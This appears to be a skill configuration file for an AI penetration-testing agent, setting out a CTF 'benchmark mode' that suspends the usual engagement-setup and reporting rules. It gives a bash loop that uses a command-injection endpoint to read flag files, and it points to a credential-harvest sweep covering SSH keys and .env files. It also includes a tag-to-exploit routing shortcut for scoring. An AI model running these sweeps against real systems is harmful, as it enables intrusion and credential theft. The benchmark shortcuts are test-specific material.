---
name: benchmark
description: "Benchmark mode marker — engagement objective is flag capture. Generic engagement rules apply unchanged."
allowed-tools: Bash Read Write
metadata:
  subdomain: benchmark
  when_to_use: "benchmark, ctf, challenge, flag capture"
  tags: benchmark, ctf
---

# Benchmark Mode

The engagement objective is **flag capture**. Per-challenge context
(target URL, vulnerability tags, flag format, mission brief, extra
service ports) is injected into the system message every model call by
`EngagementContextMiddleware` — read it; do NOT duplicate it here, and
do NOT ask the operator for it.

## Suspended CRITICAL_RULES under benchmark mode

- Rule 8 (Startup Required) — flag IS the deliverable; no roe/conops/deconfliction.
- Rule 9 (Final Report) — no executive summary; the flag string is the report.

All other CRITICAL_RULES remain active. Recon→exploit ordering, OPPLAN
discipline, no-bash-in-orchestrator, tag routing, OPSEC, and budget
pacing live in their owning prompts/skills (see `atlas.md` Rules
20/22, the recon/exploit agent prompts, and `/skills/standard/exploit/web/SKILL.md`
for vuln routing).

## SHORT-CIRCUIT — flag/credential found

When a sub-agent (recon or exploit) returns a verified flag or
flag-equivalent credential:

1. `update_objective` remaining objectives to `passed`.
2. Your VERY NEXT response is the final answer, re-echoing the flag
   VERBATIM in the format announced by the middleware (e.g.
   `Flag captured: FLAG{<value>}`). The harness scans ONLY the
   orchestrator's final message — if the flag string lives only inside
   a sub-agent return, it is LOST.

## Flag-path sweep (after RCE confirmed)

Generic skills under `/skills/standard/exploit/web/` (`command-injection/SKILL.md`, `cve/SKILL.md`, etc.) cover credential/secret extraction but intentionally exclude CTF flag conventions. Once any RCE primitive is confirmed (`id`, `hostname`, or arbitrary file read), run this single batched sweep — do NOT issue one curl per path:

```bash
# CTF flag-path conventions — XBOW / picoCTF / HackTheBox / TryHackMe overlap.
for f in /opt/flag.txt /flag /flag.txt /root/flag.txt /root/flag \
         /home/*/flag.txt /home/*/flag /tmp/flag.txt /tmp/flag \
         /var/www/flag.txt /var/www/html/flag.txt /srv/flag.txt /srv/flag; do
  result=$(curl -s "http://<TARGET>/<RCE_SINK>?cmd=cat+$f" 2>/dev/null | head -5)
  [ -n "$result" ] && echo "=== $f ===" && echo "$result"
done | tee /tmp/flag_sweep.txt
head -50 /tmp/flag_sweep.txt

# Broad flag-filename find (when path is non-standard)
curl -s "http://<TARGET>/<RCE_SINK>?cmd=find+/+-type+f+\(-name+'flag*'-o+-name+'FLAG*'\)+-not+-path+'/proc/*'+-not+-path+'/sys/*'+2>/dev/null" \
  -o /tmp/find_flag.txt
head -20 /tmp/find_flag.txt
```

Replace `<RCE_SINK>` with the confirmed injection endpoint. If the flag's `format` (e.g. `FLAG{...}`, `flag{...}`, `CTF{...}`) was announced by the middleware, additionally grep the harvest for that prefix:

```bash
grep -hoE '(FLAG|flag|CTF)\{[^}]+\}' /tmp/flag_sweep.txt /tmp/find_flag.txt | sort -u
```

The generic credential harvest (`/etc/passwd`, `.env`, configs, SSH keys, secret/cred/token files) lives in `/skills/standard/exploit/web/command-injection-exploitation/SKILL.md` — run BOTH sweeps post-RCE; flag-path first (objective), credential second (lateral).

## Tag → Skill Routing Table (BENCHMARK FAST-PATH)

Benchmark mode pre-declares `Vulnerability tags:` in the engagement context, leaking the
challenge's intended attack class. **In real engagements no such metadata exists** — agents
discover the class through the domain router skill applied to recon's raw observations.
This table is the canonical fast-path for the benchmark shortcut and the **only** place
this mapping lives. Generic agent prompts (`recon.md`, `exploit.md`, `atlas.md`)
intentionally do not encode it — they route via the domain router skills
(`/skills/standard/exploit/<domain>/SKILL.md`) on observation evidence.

**Consumer**: the orchestrator (`atlas.md`). When dispatching exploit, the orchestrator
may consult this table to pick the matching sub-skill directly from the pre-declared tags,
skipping the observation-based router classification. **Recon does NOT consume this table**
— recon's role is observation, not classification or skill recommendation.

| `Vulnerability tag` | Skill path |
|---|---|
| `sqli`                       | `/skills/standard/exploit/web/sqli/SKILL.md` |
| `blind_sqli`                 | `/skills/standard/exploit/web/blind-sqli/SKILL.md` (load with `/skills/standard/exploit/web/sqli/SKILL.md` when sqlmap+tamper is exhausted) |
| `xss`                        | `/skills/standard/exploit/web/xss/SKILL.md` |
| `ssti`                       | `/skills/standard/exploit/web/ssti-exploitation/SKILL.md` |
| `ssrf`                       | `/skills/standard/exploit/web/ssrf-exploitation/SKILL.md` |
| `xxe`                        | `/skills/standard/exploit/web/xxe-exploitation/SKILL.md` |
| `lfi`                        | `/skills/standard/exploit/web/lfi/SKILL.md` |
| `path_traversal`             | `/skills/standard/exploit/web/lfi/SKILL.md` |
| `command_injection`          | `/skills/standard/exploit/web/command-injection-exploitation/SKILL.md` |
| `insecure_deserialization`   | `/skills/standard/exploit/web/deserialization-exploitation/SKILL.md` |
| `idor`                       | `/skills/standard/exploit/web/idor-exploitation/SKILL.md` |
| `arbitrary_file_upload`      | `/skills/standard/exploit/web/file-upload/SKILL.md` |
| `file_upload`                | `/skills/standard/exploit/web/file-upload/SKILL.md` |
| `graphql`                    | `/skills/standard/exploit/web/graphql/SKILL.md` |
| `race_condition`             | `/skills/standard/exploit/web/race-condition/SKILL.md` |
| `smuggling`                  | `/skills/standard/exploit/web/smuggling/SKILL.md` |
| `crypto`                     | `/skills/standard/exploit/web/web-crypto-exploitation/SKILL.md` |
| `business_logic`             | `/skills/standard/exploit/web/business-logic/SKILL.md` |
| `default_credentials`        | `/skills/standard/exploit/web/business-logic/SKILL.md` |
| `jwt`                        | `/skills/standard/exploit/web/jwt/SKILL.md` |
| `cve`                        | `/skills/standard/exploit/web/cve/SKILL.md` |

For multiple tags → emit one `REQUIRED SKILL LOAD:` line per mapped skill.

## What this skill is NOT

- vulnerability routing → `/skills/standard/exploit/{web,ad}/SKILL.md`
- recon playbooks → `/skills/standard/recon/<area>/SKILL.md`
- OPSEC → `/skills/shared/opsec/SKILL.md`
- per-challenge context → middleware-injected, every turn
- agent-specific behavior → that agent's prompt and `/skills/<agent>/`
